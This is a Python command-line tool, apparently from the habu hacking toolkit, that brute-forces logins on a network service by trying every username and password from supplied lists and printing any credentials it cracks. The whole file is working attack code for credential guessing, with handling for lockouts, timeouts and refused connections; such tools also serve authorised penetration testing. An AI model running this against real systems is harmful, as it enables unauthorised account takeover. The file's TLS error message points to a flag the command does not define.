import logging
from time import sleep

import click

from habu.lib.auth import *
from habu.lib.auth.base import BaseAuth, ReturnCode


supported_services = {}

for subclass in BaseAuth.__subclasses__():
    for service in subclass.services:
        supported_services[service] = subclass


@click.command()
@click.option('-u', 'username', default=None, help='Username to crack')
@click.option('-U', 'username_file', type=click.File(), default=None, help='File with usernames to crack')
@click.option('-p', 'password', default=None, help='Password to test')
@click.option('-P', 'password_file', type=click.File(), default=None, help='File with passwords to test')
@click.option('-s', 'sleep_time', type=click.FLOAT, default=0, help='Seconds to sleep between probes (default: 0)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose mode')
@click.argument('host')
@click.argument('port', type=click.INT)
@click.argument('service', type=click.Choice(sorted(supported_services)))
def cmd_crack_service(host, port, username, password, username_file, password_file, service, sleep_time, verbose):
    """
    """

    if verbose:
        logging.basicConfig(level=logging.INFO)
    else:
        logging.basicConfig(level=logging.WARN)

    subclass = supported_services[service]

    usernames = []
    passwords = []

    if username:
        usernames.append(username)

    if password:
        passwords.append(password)

    if username_file:
        for line in username_file.read().split('\n'):
            usernames.append(line)

    if password_file:
        for line in password_file.read().split('\n'):
            passwords.append(line)

    if not usernames:
        logging.error('I don\'t have usernames to try.')
        return False

    if not passwords:
        logging.error('I don\'t have passwords to try.')
        return False

    logging.info('We will test {} usernames and {} passwords, total intents: {}'.format(len(usernames), len(passwords), len(usernames) * len(passwords)))

    for username in usernames:
        for password in passwords:

            logging.info('Trying {} {}'.format(username, password))

            result = subclass(username=username, password=password, port=port, service=service, address=host).login()

            if result == ReturnCode.AUTH_OK:
                print('cracked! Username: {}, Password: {}'.format(username, password))
                return True

            if result == ReturnCode.AUTH_FAILED:
                #logging.info('AUTH_FAILED')
                print('AUTH_FAILED')
                sleep(sleep_time)
                continue

            if result == ReturnCode.ACCT_BLOCKED:
                print('The account seems to be blocked, trying next account (if any)')
                break

            if result == ReturnCode.CONN_TIMEOUT:
                print('The connections has timed out, maybe the service is not listening on that port or we have been blocked, stopping')
                return False

            if result == ReturnCode.CONN_REFUSED:
                print('The connections was refused, maybe the service was gone or we have been blocked, stopping')
                return False

            if result == ReturnCode.TLS_ERROR:
                print('An SSL/TLS error was encountered. Please, check what happened and, maybe, run with the --skip-tls-errors flag')
                return False


    print('We finished without find valid credentials. Sorry.')



if __name__ == '__main__':
    cmd_crack_service()
